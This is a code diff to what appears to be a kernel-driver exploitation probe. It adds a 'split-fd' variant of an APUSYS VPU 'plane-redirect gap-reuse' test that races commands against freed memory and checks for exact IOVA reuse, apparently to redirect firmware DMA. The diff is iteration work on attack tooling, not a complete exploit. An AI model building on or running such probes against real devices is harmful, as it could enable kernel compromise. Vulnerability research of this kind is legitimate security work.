@@ -531,6 +531,7 @@ public final class ApusysIoctlProbe {
         boolean runCmdVpuXrpMemFreeRaceCompletedGapReuseIova = false;
         boolean runCmdVpuXrpPlaneRedirectGapReuseIova = false;
         boolean runCmdVpuXrpPlaneRedirectGapReuseDelayMatrixIova = false;
+        boolean runCmdVpuXrpPlaneRedirectGapReuseSplitFdIova = false;
         boolean runCmdVpuXrpDevCtrlRaceIova = false;
         boolean runCmdVpuXrpDevCtrlMatrixIova = false;
         boolean runCmdVpuXrpTwoCommandSharedIova = false;
@@ -779,6 +780,8 @@ public final class ApusysIoctlProbe {
                 runCmdVpuXrpPlaneRedirectGapReuseIova = true;
             } else if ("--run-cmd-vpu-xrp-plane-redirect-gap-reuse-delay-matrix-iova".equals(arg)) {
                 runCmdVpuXrpPlaneRedirectGapReuseDelayMatrixIova = true;
+            } else if ("--run-cmd-vpu-xrp-plane-redirect-gap-reuse-splitfd-iova".equals(arg)) {
+                runCmdVpuXrpPlaneRedirectGapReuseSplitFdIova = true;
             } else if ("--run-cmd-vpu-xrp-dev-ctrl-race-iova".equals(arg)) {
                 runCmdVpuXrpDevCtrlRaceIova = true;
             } else if ("--run-cmd-vpu-xrp-dev-ctrl-matrix-iova".equals(arg)) {
@@ -952,6 +955,7 @@ public final class ApusysIoctlProbe {
                 || runCmdVpuXrpMemFreeRaceCompletedGapReuseIova
                 || runCmdVpuXrpPlaneRedirectGapReuseIova
                 || runCmdVpuXrpPlaneRedirectGapReuseDelayMatrixIova
+                || runCmdVpuXrpPlaneRedirectGapReuseSplitFdIova
                 || runCmdVpuXrpDevCtrlRaceIova
                 || runCmdVpuXrpDevCtrlMatrixIova
                 || runCmdVpuXrpTwoCommandSharedIova
@@ -1566,6 +1570,10 @@ public final class ApusysIoctlProbe {
 
             if (runCmdVpuXrpPlaneRedirectGapReuseDelayMatrixIova) {
                 runRunCmdVpuXrpPlaneRedirectGapReuseDelayMatrixProbe();
+            }
+
+            if (runCmdVpuXrpPlaneRedirectGapReuseSplitFdIova) {
+                runRunCmdVpuXrpPlaneRedirectGapReuseSplitFdProbe();
             }
 
             if (runCmdVpuXrpDevCtrlRaceIova) {
@@ -5083,16 +5091,40 @@ public final class ApusysIoctlProbe {
         }
     }
 
+    private static void runRunCmdVpuXrpPlaneRedirectGapReuseSplitFdProbe()
+            throws Exception {
+        System.out.println("\n[*] === APUSYS run_cmd VPU plane-redirect"
+            + " gap-reuse split-fd IOVA probe ===");
+        System.out.println("[*] Mode: plane-redirect-gap-reuse with a dedicated"
+            + " second /dev/apusys fd for replacement imports only.");
+        System.out.println("[*] Hypothesis: import_fail at long delays is caused"
+            + " by the in-flight VPU command on raceFd contending with"
+            + " mem_create2 in the APUSYS mem manager. Using a clean replacementFd"
+            + " (no in-flight state) should eliminate contention and let replacement"
+            + " imports establish their IOMMU mapping before firmware DMA fires.");
+        System.out.println("[*] Best allocator shape: p12/r8, 64K, delay=0ms"
+            + " (no delay: test whether split-fd alone reduces import_fail).");
+        loadRuntimeLibraries();
+        runPlaneRedirectGapReuseCase(0x10000, 12, 8, 20, 0, true);
+    }
+
     private static void runPlaneRedirectGapReuseCase(
             int importSize, int poolCount, int replacementCount,
             int iterations) throws Exception {
         runPlaneRedirectGapReuseCase(importSize, poolCount, replacementCount,
-            iterations, 0);
+            iterations, 0, false);
     }
 
     private static void runPlaneRedirectGapReuseCase(
             int importSize, int poolCount, int replacementCount,
             int iterations, int freeDelayMs) throws Exception {
+        runPlaneRedirectGapReuseCase(importSize, poolCount, replacementCount,
+            iterations, freeDelayMs, false);
+    }
+
+    private static void runPlaneRedirectGapReuseCase(
+            int importSize, int poolCount, int replacementCount,
+            int iterations, int freeDelayMs, boolean splitFd) throws Exception {
         // plane-redirect settings shape: VPU_DESC_LIBVPU_SETTINGS5 with
         // planeValid overlay pointing plane MVA to sharedIova + 0x700.
         VpuDescriptorPlaneOverride planeValidOverride =
@@ -5129,12 +5161,14 @@ public final class ApusysIoctlProbe {
 
         for (int iter = 0; iter < iterations; iter++) {
             int raceFd = -1;
+            int replFd  = -1;  // separate fd for replacement imports when splitFd=true
             ReplacementImport[] pool = null;
             ReplacementImport cmd = null;
             boolean[] poolImported = new boolean[poolCount];
             boolean[] replImported = new boolean[replacementCount];
             try {
                 raceFd = DrmTrigger.openDev(APUSYS_DEV);
+                if (splitFd) replFd = DrmTrigger.openDev(APUSYS_DEV);
 
                 // ----------------------------------------------------------
                 // 1. Import plane-target pool
@@ -5226,7 +5260,11 @@ public final class ApusysIoctlProbe {
 
                 // ----------------------------------------------------------
                 // 7. Import replacements; check exact IOVA reuse.
+                //    When splitFd=true, use a clean fd with no in-flight
+                //    commands to avoid mem_create2 contention from the VPU
+                //    command running on raceFd.
                 // ----------------------------------------------------------
+                int importFd = (splitFd && replFd >= 0) ? replFd : raceFd;
                 int exactTargetThis = 0;
                 int importFailThis  = 0;
                 int firstExactIdx   = -1;
@@ -5234,7 +5272,7 @@ public final class ApusysIoctlProbe {
                 for (int ri = 0; ri < replacementCount; ri++) {
                     long md = DrmTrigger.sScratchBuf + OFF_MEM_REUSE_BASE
                         + ((poolCount + ri) * OFF_MEM_REUSE_STRIDE);
-                    long r = importProfilerMem(raceFd, replacements[ri], md,
+                    long r = importProfilerMem(importFd, replacements[ri], md,
                         importSize, "plane_redir_repl_" + ri, false);
                     if (r < 0) { importFailThis++; continue; }
                     replImported[ri] = true;
@@ -5304,13 +5342,19 @@ public final class ApusysIoctlProbe {
 
             } finally {
                 if (raceFd >= 0) {
+                    // Free replacement imports via the fd they were imported on.
+                    int cleanFd = (splitFd && replFd >= 0) ? replFd : raceFd;
                     for (int ri = 0; ri < replacementCount; ri++) {
                         if (!replImported[ri]) continue;
                         long md = DrmTrigger.sScratchBuf + OFF_MEM_REUSE_BASE
                             + ((poolCount + ri) * OFF_MEM_REUSE_STRIDE);
-                        freeProfilerMem(raceFd, replacements[ri], md,
+                        freeProfilerMem(cleanFd, replacements[ri], md,
                             "plane_redir_repl_cleanup_" + ri, false);
                         replImported[ri] = false;
+                    }
+                    if (splitFd && replFd >= 0) {
+                        DrmTrigger.closeFd(replFd);
+                        replFd = -1;
                     }
                     freeProfilerMem(raceFd, cmd,
                         DrmTrigger.sScratchBuf + OFF_MEM_B,
